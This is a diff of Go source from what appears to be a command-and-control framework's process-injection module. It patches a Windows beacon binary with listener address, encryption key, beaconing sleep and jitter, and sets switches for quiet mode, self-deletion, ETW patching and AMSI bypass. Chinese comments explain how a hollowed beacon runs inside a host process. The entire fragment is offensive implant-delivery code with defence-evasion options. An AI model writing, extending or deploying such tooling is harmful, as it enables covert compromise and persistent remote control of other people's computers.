@@ -211,18 +211,24 @@ func dispatchInjectInner(uid string, pid int, tech string) error {
 	if err != nil {
 		return fmt.Errorf("读取模板失败: %v", err)
 	}
-	patched, err := delivery.PatchClientBinary(binaryData, delivery.PatchOptions{
+	beaconSleep, beaconJitter := listenerBeaconOverrides(lis)
+	opts := delivery.PatchOptions{
 		ListenerConfig: listenerType + "://" + connectAddress,
 		OS:             "windows",
 		Arch:           "amd64",
 		VKey:           lis.VKey,
 		EncryptSalt:    lis.EncryptionSalt,
+		SleepSeconds:   beaconSleep,
+		JitterPercent:  beaconJitter,
 		QuietMode:      "1",
 		Pass:           "",  // hollow 无命令行参数，禁止口令（ExecuteKey 校验会失败）
 		AutoDelete:     "0", // 镂空 beacon 以系统/目标进程路径运行，禁止自我删除宿主文件
 		ETWPatch:       "0", // 注入场景保持最小对抗，避免干扰宿主进程
 		AmsiBypass:     "0",
-	})
+	}
+	// 画像特征按该监听器记录补齐（派生连接地址可能与库中地址不完全一致）
+	applyListenerProfileRecord(&opts, lis)
+	patched, err := delivery.PatchClientBinary(binaryData, opts)
 	if err != nil {
 		return fmt.Errorf("patch 失败: %v", err)
 	}
